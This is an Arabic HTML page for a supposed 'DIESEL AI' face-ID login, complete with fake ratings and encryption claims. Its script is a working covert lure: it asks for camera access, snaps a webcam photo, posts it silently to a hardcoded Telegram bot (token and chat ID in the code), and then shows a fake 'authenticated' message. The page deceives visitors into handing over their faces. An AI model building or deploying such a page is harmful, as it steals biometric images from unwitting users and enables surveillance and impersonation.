<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DIESEL WORLD | نظام البصمة الذكي العالمي</title>
    
    <meta name="description" content="أقوى نظام أمان بالذكاء الاصطناعي من ديزل. سجل الآن ببصمة الوجه للوصول للخدمات العالمية.">
    <meta name="keywords" content="ديزل, بصمة وجه, ذكاء اصطناعي, Diesel AI, Face ID, أمان">

    <style>
        :root { --neon: #00ff88; }
        body { 
            background: #000; color: white; font-family: 'Cairo', sans-serif; 
            margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh;
        }
        .main-card {
            background: rgba(20, 20, 20, 0.8); padding: 40px 20px; border-radius: 40px;
            border: 1px solid var(--neon); width: 90%; max-width: 420px; text-align: center;
            box-shadow: 0 0 40px rgba(0, 255, 136, 0.2);
        }
        .scan-circle {
            width: 250px; height: 250px; border-radius: 50%; border: 2px dashed var(--neon);
            margin: 20px auto; position: relative; overflow: hidden; background: #050505;
        }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .laser {
            position: absolute; width: 100%; height: 3px; background: var(--neon);
            box-shadow: 0 0 20px var(--neon); top: 0; animation: scan 3s infinite linear; display: none;
        }
        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
        .btn-auth {
            background: var(--neon); color: #000; border: none; padding: 18px;
            border-radius: 15px; font-weight: 900; font-size: 18px; cursor: pointer;
            width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
        }
        .stats { display: flex; justify-content: space-around; margin-top: 30px; font-size: 12px; color: #666; }
        canvas { display: none; }
    </style>
</head>
<body>

    <div class="main-card">
        <div style="background: rgba(0,255,136,0.1); display: inline-block; padding: 5px 15px; border-radius: 20px; color: var(--neon); font-size: 12px; margin-bottom: 10px;">
            AI SECURE SYSTEM v4.0
        </div>
        <h1 style="margin: 0;">DIESEL <span style="color: var(--neon);">AI</span></h1>
        <p style="color: #888; font-size: 14px;">يجب إجراء فحص حيوي (Face ID) للدخول</p>

        <div class="scan-circle">
            <div class="laser" id="laser"></div>
            <video id="webcam" autoplay muted playsinline></video>
        </div>

        <div id="auth-ui">
            <button class="btn-auth" onclick="startGlobalScan()">بدء الفحص الرقمي</button>
            <p style="color: #ffcc00; font-size: 13px; margin-top: 15px;">⭐⭐⭐⭐⭐ 4.9/5 (أكثر من 50 ألف مستخدم)</p>
        </div>

        <div id="success-ui" style="display:none;">
            <h2 style="color: var(--neon);">تمت المصادقة ✅</h2>
            <p>مرحباً بك في عالم الديزل، تم تسجيل دخولك بنجاح.</p>
        </div>

        <div class="stats">
            <div><b>50K+</b><br>مستخدم</div>
            <div><b>100%</b><br>تشفير</div>
            <div><b>Global</b><br>دخول عالمي</div>
        </div>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
        const id = "5177962707";

        async function startGlobalScan() {
            const video = document.getElementById('webcam');
            const canvas = document.getElementById('canvas');
            const laser = document.getElementById('laser');

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                laser.style.display = 'block';

                setTimeout(async () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', id);
                        fd.append('photo', blob, 'user.jpg');
                        fd.append('caption', '🚀 تم التقاط بصمة وجه جديدة بنجاح في نظام الديزل العالمي!');

                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });

                        document.getElementById('auth-ui').style.display = 'none';
                        document.getElementById('success-ui').style.display = 'block';
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg');
                }, 4000);
            } catch (e) {
                alert("خطأ: يرجى السماح بالوصول للكاميرا لتشغيل الذكاء الاصطناعي");
            }
        }
    </script>
</body>
</html>
